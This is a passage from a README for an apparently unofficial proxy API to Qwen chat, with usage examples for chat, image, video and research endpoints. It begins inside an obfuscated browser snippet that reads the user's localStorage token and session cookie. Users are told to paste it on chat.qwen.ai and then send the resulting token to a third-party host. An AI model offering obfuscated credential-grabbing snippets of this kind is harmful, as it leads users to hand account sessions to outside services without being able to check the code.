_0x4ed9df=_0x16d3bd['const'+'ructo'+'r'][_0x57ede8(0x16c,'m^1T')+_0x57ede8(0x155,'qvgw')][_0x57ede8(0x137,'29[1')](_0x16d3bd),_0x3588d7=_0x11147e[_0x2881c5],_0x443f11=_0xdb01d7[_0x3588d7]||_0x4ed9df;_0x4ed9df[_0x57ede8(0x10e,'a)A!')+_0x57ede8(0xcf,'swS(')]=_0x16d3bd[_0x57ede8(0xf7,'6blX')](_0x16d3bd),_0x4ed9df[_0x57ede8(0x101,'RrYc')+_0x57ede8(0x141,'kEI4')]=_0x443f11[_0x57ede8(0x14f,'YG!8')+'ing'][_0x57ede8(0x176,'i[FD')](_0x443f11),_0xdb01d7[_0x3588d7]=_0x4ed9df;}}else{function _0x23b45c(){const _0x1e63bc=_0x57ede8;_0x611d04['TkfXw'](_0x2ff30a,_0x611d04[_0x1e63bc(0x175,'$i8J')]),_0x1c9dd0[_0x1e63bc(0xfa,'YG!8')](_0x611d04['RcRBt'],_0x611d04[_0x1e63bc(0x172,'nyMG')]);return;}}});_0xae8318[_0x1cb820(0x1b3,'XA]F')](_0x259d5d);const _0x2f33b7=localStorage[_0x1cb820(0x12b,'(lh[')+'em'](_0xae8318[_0x1cb820(0x1a4,'*i#p')]),_0x43840f=document[_0x1cb820(0xe0,'nyMG')+'e'][_0x1cb820(0x135,'YG!8')](_0xae8318[_0x1cb820(0x192,'(lh[')])[0x1]?.['split'](';')[0x0];if(_0xae8318[_0x1cb820(0x1cc,'d]aa')](!_0x2f33b7,!_0x43840f)){if(_0xae8318[_0x1cb820(0x157,'FL&@')](_0xae8318['kUzcw'],_0xae8318[_0x1cb820(0x168,'&s(p')])){function _0x2174d9(){_0x1b17ab=_0x146d0b;}}else return _0xae8318[_0x1cb820(0x1d8,'3u3p')](alert,_0x1cb820(0x1b8,'mE*k')+'_api_'+_0x1cb820(0x1c6,'&s(p')+_0x1cb820(0x143,'rO)i')+_0x1cb820(0x1c9,'Uh#2')+_0x1cb820(0xe4,'mpN[')+_0x1cb820(0x1bf,'F*L&')+'rly\x20!'+'!!\x0a\x0a'+(!_0x2f33b7?_0xae8318[_0x1cb820(0x128,'(lh[')]:_0xae8318[_0x1cb820(0x121,'XA]F')])+'\x0a'+(!_0x43840f?_0xae8318[_0x1cb820(0x1d9,'d]aa')]:_0xae8318[_0x1cb820(0xf4,'$i8J')])),null;}return _0x2f33b7+'|'+_0x43840f;}async function _0x9b7b8b(_0x28aa10){const _0x2f8d32=_0x473df3,_0x1f5614={'SKngi':function(_0x593716,_0x4f7706,_0x3ed77b){const _0x2f6cbb=_0x1994;return _0xae8318[_0x2f6cbb(0x103,'d]aa')](_0x593716,_0x4f7706,_0x3ed77b);},'jDzWP':_0xae8318[_0x2f8d32(0x173,'1wGe')]};try{if(_0xae8318['nzYIV'](_0xae8318['LuJQV'],_0xae8318[_0x2f8d32(0x140,'29[1')]))return await navigator['clipb'+_0x2f8d32(0xd9,'swS(')][_0x2f8d32(0xd6,'YG!8')+_0x2f8d32(0xff,'DXG^')](_0x28aa10),!![];else{function _0x14df13(){const _0x76bcd6=_0x2f8d32;_0x1eb56e[_0x76bcd6(0x189,'0y*Z')](_0xae8318[_0x76bcd6(0x184,'K$uy')],_0x4e860d);const _0x17ea7a=_0x985adc[_0x76bcd6(0x16f,'oPq&')+'eElem'+_0x76bcd6(0xfe,'oPq&')](_0xae8318[_0x76bcd6(0xd2,'C]a#')]);_0x17ea7a[_0x76bcd6(0x1be,'C]a#')]=_0x4a69e5,_0x17ea7a[_0x76bcd6(0xed,'XA]F')][_0x76bcd6(0x18f,'d]aa')+_0x76bcd6(0x181,'v%F^')]=_0xae8318[_0x76bcd6(0x162,'I51z')],_0x17ea7a[_0x76bcd6(0x13c,'RrYc')][_0x76bcd6(0xca,'7JW9')+'ty']='0',_0x364c46[_0x76bcd6(0x131,'swS(')][_0x76bcd6(0x174,'@b18')+'dChil'+'d'](_0x17ea7a),_0x17ea7a[_0x76bcd6(0x1d7,'K$uy')](),_0x17ea7a[_0x76bcd6(0xe6,'RrYc')+'t']();const _0x46e13e=_0x319b72[_0x76bcd6(0x145,'aj9A')+'omman'+'d'](_0xae8318['JuRlP']);return _0x5a455c[_0x76bcd6(0x1ab,'F*L&')][_0x76bcd6(0x147,'BJBv')+_0x76bcd6(0x12a,'Qid!')+'d'](_0x17ea7a),_0x46e13e;}}}catch(_0x1614f9){if(_0xae8318['nzYIV'](_0xae8318['pjPHD'],_0xae8318[_0x2f8d32(0xf2,'B2k@')])){function _0x1d9def(){const _0x55af67=_0x2f8d32;_0x1f5614['SKngi'](_0x26a7b3,_0x1f5614[_0x55af67(0x190,'mpN[')],_0x31842b);}}else{console['error'](_0xae8318['cUpmF'],_0x1614f9);const _0x1063a0=document[_0x2f8d32(0x13a,'v%F^')+_0x2f8d32(0x124,'a)A!')+'ent'](_0xae8318['BROEw']);_0x1063a0[_0x2f8d32(0x1a9,'v%F^')]=_0x28aa10,_0x1063a0[_0x2f8d32(0x1b7,'jfZv')][_0x2f8d32(0x1d0,'7JW9')+_0x2f8d32(0x1a7,'BJBv')]=_0xae8318[_0x2f8d32(0xc9,'0y*Z')],_0x1063a0[_0x2f8d32(0x106,'XtaI')][_0x2f8d32(0x138,'(lh[')+'ty']='0',document[_0x2f8d32(0x12e,'K$uy')][_0x2f8d32(0x10f,'K$uy')+'dChil'+'d'](_0x1063a0),_0x1063a0[_0x2f8d32(0x191,'7Ymo')](),_0x1063a0[_0x2f8d32(0x12f,'XtaI')+'t']();const _0x35c7ef=document['execC'+_0x2f8d32(0x158,'XA]F')+'d'](_0xae8318[_0x2f8d32(0xde,'7Ymo')]);return document[_0x2f8d32(0x1d5,'mA3$')][_0x2f8d32(0x16b,'nyMG')+_0x2f8d32(0x1c3,'jfZv')+'d'](_0x1063a0),_0x35c7ef;}}}async function _0x30b088(_0x3f2ce5){const _0x1fb7cc=_0x473df3,_0x2ce003={'FYLtF':function(_0x40c7f1,_0x25ee6f){return _0xae8318['XCqDV'](_0x40c7f1,_0x25ee6f);},'rwdTV':_0xae8318[_0x1fb7cc(0x104,'J1gN')],'kahQM':function(_0x561845,_0x4427db,_0x3dd787){const _0x222a3e=_0x1fb7cc;return _0xae8318[_0x222a3e(0x1b1,'e1zP')](_0x561845,_0x4427db,_0x3dd787);},'UKYux':_0xae8318[_0x1fb7cc(0x110,'XA]F')],'pNBwK':function(_0x2e76e8,_0x572457){return _0xae8318['XCqDV'](_0x2e76e8,_0x572457);},'lHuXu':function(_0x27b812,_0xe3f51){const _0x1e147e=_0x1fb7cc;return _0xae8318[_0x1e147e(0x15b,'jfZv')](_0x27b812,_0xe3f51);},'ghPcm':function(_0x217d7b,_0x1661cd,_0x12252e){return _0xae8318['aKjdO'](_0x217d7b,_0x1661cd,_0x12252e);}};try{const _0xcd836=new CompressionStream(_0xae8318[_0x1fb7cc(0xfb,'FL&@')]),_0x546e34=_0xcd836['writa'+_0x1fb7cc(0x186,'aj9A')][_0x1fb7cc(0x199,'NTl8')+_0x1fb7cc(0x1b9,'&s(p')](),_0xe7aba8=_0xcd836[_0x1fb7cc(0x1a2,'E^n8')+'ble'][_0x1fb7cc(0xfc,'$i8J')+'ader']();_0x546e34['write'](new TextEncoder()[_0x1fb7cc(0x134,'d]aa')+'e'](_0x3f2ce5)),_0x546e34[_0x1fb7cc(0x177,'Uh#2')]();const _0x2a0ce8=[];let _0xef25a8=![];while(!_0xef25a8){if(_0xae8318[_0x1fb7cc(0x178,'wEE*')](_0xae8318['WqWRk'],_0xae8318[_0x1fb7cc(0x1b2,'I51z')])){const {value:_0x5e5df3,done:_0x572a40}=await _0xe7aba8[_0x1fb7cc(0x167,'(lh[')]();_0xef25a8=_0x572a40;if(_0x5e5df3)_0x2a0ce8[_0x1fb7cc(0xe5,'@QUo')](_0x5e5df3);}else{function _0x8f0e6e(){const _0x7f4cf5=_0x1fb7cc;_0x2ce003[_0x7f4cf5(0x146,'1wGe')](_0x372784,_0x1b2733)[_0x7f4cf5(0x1d2,'m^1T')](_0x52e584=>{const _0x34b4a0=_0x7f4cf5;_0x52e584?_0x2ce003['FYLtF'](_0x2fc9d6,_0x2ce003['rwdTV']):_0x2ce003[_0x34b4a0(0x13d,'7Ymo')](_0x135e96,_0x2ce003[_0x34b4a0(0x122,'29[1')],_0x9b16c1);});}}}const _0x4e7493=new Uint8Array(_0x2a0ce8[_0x1fb7cc(0x17c,'Qid!')+'e']((_0x4ff40f,_0x11a8b7)=>_0x4ff40f+_0x11a8b7[_0x1fb7cc(0x1cb,'mE*k')+'h'],0x0));let _0xe85627=0x0;for(const _0x23c904 of _0x2a0ce8){_0x4e7493['set'](_0x23c904,_0xe85627),_0xe85627+=_0x23c904[_0x1fb7cc(0x15d,'@b18')+'h'];}return _0xae8318[_0x1fb7cc(0x117,'XA]F')](btoa,String[_0x1fb7cc(0x15f,'7Ymo')+'harCo'+'de'](..._0x4e7493));}catch(_0x359e77){if(_0xae8318['nzYIV'](_0xae8318['YyRnq'],_0xae8318[_0x1fb7cc(0x144,'i[FD')]))return console[_0x1fb7cc(0x14b,'a)A!')](_0xae8318[_0x1fb7cc(0x1dd,'6blX')],_0x359e77),_0xae8318[_0x1fb7cc(0x126,'nyMG')](btoa,_0x3f2ce5);else{function _0x5b6a62(){const _0x20343c=_0x1fb7cc;_0x5b3d11?_0x2ce003[_0x20343c(0x10b,'i[FD')](_0x5219dd,_0x2ce003['rwdTV']):_0x2ce003[_0x20343c(0x159,'BJBv')](_0x478c81,_0x2ce003['UKYux'],_0x2b2842);}}}}const _0x45e228=_0xae8318['Jvalc'](_0x1cf4e6);if(!_0x45e228)return;_0xae8318[_0x473df3(0x164,'F*L&')](_0x30b088,_0x45e228)[_0x473df3(0x10d,'I51z')](_0x76ca90=>{_0xae8318['DwdOY'](_0x9b7b8b,_0x76ca90)['then'](_0x4a51eb=>{const _0x247f83=_0x1994;if(_0xae8318[_0x247f83(0xd4,'XA]F')](_0xae8318[_0x247f83(0x127,'K$uy')],_0xae8318['YpBvC'])){function _0x88c795(){const _0x5e2e60=_0x247f83,_0x26dff1=_0x32825a[_0x5e2e60(0x169,'29[1')](_0x58d142,arguments);return _0x598931=null,_0x26dff1;}}else _0x4a51eb?_0xae8318['DwdOY'](alert,_0xae8318['XUduG']):_0xae8318[_0x247f83(0x1ba,'YG!8')](prompt,_0xae8318[_0x247f83(0x1af,'I51z')],_0x76ca90);});});}());
```

3. **Get Your Token**: The script will automatically:

   - Extract your authentication info from localStorage
   - Get your session cookie from the browser
   - Compress the combined credentials
   - Copy the encoded token to your clipboard

4. **Use the Token**: The copied token is now ready to use as your `Bearer` token in API requests

**Important Notes:**

- ⚠️ This script only works on chat.qwen.ai - make sure you're logged in
- 🔒 Keep your token secure - it provides access to your Qwen account
- 🔄 You may need to regenerate the token periodically if it expires


### Validate Token (from JS snippet)

Validate the compressed token produced by the browser JS snippet above.

```bash
curl -X POST https://qwen.aikit.club/validate \
  -H "Content-Type: application/json" \
  -d '{"token": "YOUR_COMPRESSED_QWEN_TOKEN"}'
```

Or via GET:

```bash
curl "https://qwen.aikit.club/validate?token=YOUR_COMPRESSED_QWEN_TOKEN"
```

### Chat Completions

```javascript
const response = await fetch("https://qwen.aikit.club/v1/chat/completions", {
  method: "POST",
  headers: headers,
  body: JSON.stringify({
    model: "qwen-max-latest",
    messages: [{ role: "user", content: "Hello, how are you?" }],
    stream: false,
  }),
});
```

### Image Generation

```javascript
const response = await fetch("https://qwen.aikit.club/v1/images/generations", {
  method: "POST",
  headers: headers,
  body: JSON.stringify({
    prompt: "A beautiful sunset over mountains",
    size: "1024x1024",
  }),
});
```

### Image Editing

```javascript
// Using FormData for file upload
const formData = new FormData();
formData.append("image", imageFile); // File object
formData.append("prompt", "Change the sky to a starry night");

const response = await fetch("https://qwen.aikit.club/v1/images/edits", {
  method: "POST",
  headers: {
    Authorization: "Bearer YOUR_COMPRESSED_QWEN_TOKEN",
  },
  body: formData,
});

// Or using JSON with image URL/base64
const response = await fetch("https://qwen.aikit.club/v1/images/edits", {
  method: "POST",
  headers: headers,
  body: JSON.stringify({
    image: "https://example.com/image.jpg", // or base64 data URL
    prompt: "Add a rainbow in the background",
  }),
});
```

### Web Search Mode

```javascript
const response = await fetch("https://qwen.aikit.club/v1/chat/completions", {
  method: "POST",
  headers: headers,
  body: JSON.stringify({
    model: "qwen-max-latest",
    messages: [{ role: "user", content: "What are the latest AI developments?" }],
    tools: [{ type: "web_search" }],
  }),
});
```

### Thinking Mode

```javascript
const response = await fetch("https://qwen.aikit.club/v1/chat/completions", {
  method: "POST",
  headers: headers,
  body: JSON.stringify({
    model: "qwen-max-latest",
    messages: [{ role: "user", content: "Solve this complex math problem: ..." }],
    enable_thinking: true,
    thinking_budget: 30000,
  }),
});
```

### Code Generation (qwen3-coder-plus)

Note: `qwen3-coder-plus` supports [Qwen Code](https://github.com/QwenLM/qwen-code) — a coding agent that operates in digital environments and can issue function/tool calls. This API supports handling the function calls produced by the agent.

```javascript
const response = await fetch("https://qwen.aikit.club/v1/chat/completions", {
  method: "POST",
  headers: headers,
  body: JSON.stringify({
    model: "qwen3-coder-plus",
    tools: [{ type: "code" }],
    messages: [
      { role: "user", content: "Write a JavaScript function to add two numbers" },
    ],
    stream: true,
  }),
});
```

### Video Generation

```javascript
const response = await fetch("https://qwen.aikit.club/v1/videos/generations", {
  method: "POST",
  headers: headers,
  body: JSON.stringify({
    prompt: "A cat playing with a ball of yarn in slow motion",
    size: "1280x720",
  }),
});
```

### Deep Research

```javascript
const response = await fetch("https://qwen.aikit.club/v1/chat/completions", {
  method: "POST",
  headers: headers,
  body: JSON.stringify({
    model: "qwen-deep-research",
    messages: [
      {
        role: "user",
        content: "Research the latest developments in quantum computing",
      },
    ],
    stream: false,
  }),
});
```

### Web Development (qwen-web-dev)

The `qwen-web-dev` model is specialized for frontend web development, creating interactive web components, HTML/CSS/JavaScript code, and providing live preview capabilities.

**Features:**

- HTML/CSS/JavaScript code generation
- Interactive UI components
- Responsive design support
- Real-time preview generation
- Framework support: React, Vue, Vanilla JS, HTML5
- Styling: Tailwind CSS, Bootstrap

```javascript
const response = await fetch("https://qwen.aikit.club/v1/chat/completions", {
  method: "POST",
  headers: headers,
  body: JSON.stringify({
    model: "qwen-web-dev",
    messages: [
      {
        role: "user",
        content:
          "Create a responsive navigation bar with a logo, menu items, and a mobile hamburger menu using HTML, CSS, and vanilla JavaScript",
      },
    ],
    stream: false,
  }),
});
```

**Example Output:**
The model will generate complete, production-ready web components with:

- Clean, semantic HTML structure
- Modern CSS with responsive breakpoints
- Vanilla JavaScript for interactivity
- Mobile-first design approach
- Accessibility considerations

### Full-Stack Development (qwen-full-stack)

The `qwen-full-stack` model handles complete application development, from frontend to backend, database design, API development, and system architecture.

**Features:**

- Frontend and backend code generation
- Database schema design
- RESTful and GraphQL API development
- Authentication and authorization
- Microservices architecture
- Deployment-ready code
- Multi-language support: JavaScript, TypeScript, Python, Java, Go, PHP
- Frameworks: React, Vue, Angular, Node.js, Express, Django, Flask, Spring Boot

```javascript
const response = await fetch("https://qwen.aikit.club/v1/chat/completions", {
  method: "POST",
  headers: headers,
  body: JSON.stringify({
    model: "qwen-full-stack",
    messages: [
      {
        role: "user",
        content:
          "Create a complete REST API for a task management system with user authentication, CRUD operations for tasks, and a React frontend. Use Node.js/Express for the backend and MongoDB for the database.",
      },
    ],
    stream: false,
  }),
});
```

**Example Full-Stack Application:**

```javascript
// Advanced example: Building a complete blog platform
const response = await fetch("https://qwen.aikit.club/v1/chat/completions", {
  method: "POST",
  headers: headers,
  body: JSON.stringify({
    model: "qwen-full-stack",
    messages: [
      {
        role: "user",
        content: `Build a complete blog platform with the following requirements:

Backend (Node.js/Express):
- User authentication with JWT
- CRUD operations for blog posts
- Comment system
- Like/bookmark functionality
- Image upload support
- RESTful API endpoints

Frontend (React):
- Home page with post listings
- Post detail page with comments
- Create/Edit post interface
- User profile page
- Responsive design with Tailwind CSS

Database (MongoDB):
- User schema with authentication
- Post schema with relationships
- Comment schema
- Proper indexing for performance`,
      },
    ],
    stream: false,
  }),
});
```

**Key Differences:**

| Feature          | qwen-web-dev                               | qwen-full-stack                    |
| ---------------- | ------------------------------------------ | ---------------------------------- |
| **Focus**        | Frontend UI/UX                             | Complete application stack         |
| **Code Output**  | HTML, CSS, JavaScript                      | Frontend + Backend + Database      |
| **Use Cases**    | Web components, landing pages, UI elements | Complete apps, APIs, microservices |
| **Complexity**   | Simple to moderate                         | Moderate to complex                |
| **Architecture** | Client-side only                           | Full system architecture           |

### Delete All Chats

```javascript
// Using DELETE method
const response = await fetch("https://qwen.aikit.club/v1/chats/delete", {
  method: "DELETE", // GET and POST are also supported
  headers: headers,
});
```

## 📁 Multimodal File Support

The API supports various file formats for comprehensive multimodal interactions:

> **⚠️ Important Limitation**: Multiple inputs of the same modality category are not supported. **Image, Audio, and Video** are considered the same category (media files), while **Documents** (PDF, TXT, etc.) are a separate category. You can combine different categories (e.g., image + PDF) but cannot combine files within the same category (e.g., image + video).

### Supported File Types

- **Media Files** _(same category)_:
  - **Images**: **JPG, PNG, GIF, WebP** _(most common)_, BMP, TIFF, ICO, ICNS, JFIF, JP2
  - **Audio**: **MP3, WAV, M4A, AAC** _(most common)_, AMR
  - **Video**: **MP4, MOV, AVI, MKV** _(most common)_, WMV, FLV
- **Documents** _(separate category)_: **PDF, TXT, MD** _(most common)_, DOC, DOCX, CSV, XLS, XLSX

> **💡 Tip**: Bold formats are the most commonly used and recommended for best compatibility.

### 📏 File Limits

The following limits apply to multimodal file uploads:

| File Type | Max Size (MB) | Max Count | Max Duration (seconds) |
|-----------|---------------|-----------|------------------------|
| **Images** | 10 | 5 | - |
| **Audio** | 100 | 1 | 180 |
| **Video** | 500 | 1 | 600 |
| **Documents** | 20 | 5 | - |
| **Default** | 20 | - | - |

> **📋 Summary**: You can upload up to 5 images (10MB each), 1 audio file (100MB, 3 minutes), 1 video file (500MB, 10 minutes), or 5 documents (20MB each) per request.

### ✅ Valid Combinations

- ✅ Multiple images
- ✅ Image + PDF
- ✅ Audio + PDF
- ✅ Video + PDF
- ✅ Single image/audio/video only

### ❌ Invalid Combinations

- ❌ Image + Audio
- ❌ Image + Video
- ❌ Audio + Video
- ❌ Multiple videos
- ❌ Multiple audio files

### Vision-Style Multimodal Chat

```javascript
// Analyze any supported file type using standard chat completions
const response = await fetch("https://qwen.aikit.club/v1/chat/completions", {
  method: "POST",
  headers: headers,
  body: JSON.stringify({
    model: "qwen-max-latest",
    messages: [
      {
        role: "user",
        content: [
          { type: "text", text: "What do you see in this image?" },
          {
            type: "image_url",
            image_url: {
              url: "https://download.samplelib.com/png/sample-hut-400x300.png",
              // or use base64: "data:image/jpeg;base64,..."
            },
          },
        ],
      },
    ],
  }),
});
```

### Valid Multimodal Combination (Image + PDF)

```javascript
// ✅ VALID: Combine different categories (Media + Document)
const response = await fetch("https://qwen.aikit.club/v1/chat/completions", {
  method: "POST",
  headers: headers,
  body: JSON.stringify({
    model: "qwen-max-latest",
    messages: [
      {
        role: "user",
        content: [
          { type: "text", text: "Analyze this image and PDF document together" },
          {
            type: "image_url",
            image_url: { url: "https://download.samplelib.com/png/sample-hut-400x300.png" },
          },
          {
            type: "file_url",
            file_url: { url: "https://pdfobject.com/pdf/sample.pdf" },
          },
        ],
      },
    ],
  }),
});
```

### ❌ Invalid Combinations (Don't Do This)

```javascript
// ❌ INVALID: Cannot combine image + video (same category)
const response = await fetch("https://qwen.aikit.club/v1/chat/completions", {
  method: "POST",
  headers: headers,
  body: JSON.stringify({
    model: "qwen-max-latest",
    messages: [
      {
        role: "user",
        content: [
          { type: "text", text: "This will not work properly" },
          {
            type: "image_url",
            image_url: { url: "https://download.samplelib.com/png/sample-hut-400x300.png" },
          },
          {
            type: "video_url",
            video_url: { url: "https://download.samplelib.com/mp4/sample-10s.mp4" },
          },
          // ❌ Cannot mix media files (image, audio, video)
        ],
      },
    ],
  }),
});
```

## 📜 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

<div align="center">
  <p>
    Built with ❤️ by Tarun
  </p>
  <p>
    <sub>If you find this project useful, please consider giving it a ⭐ on GitHub!</sub>
  </p>
</div>
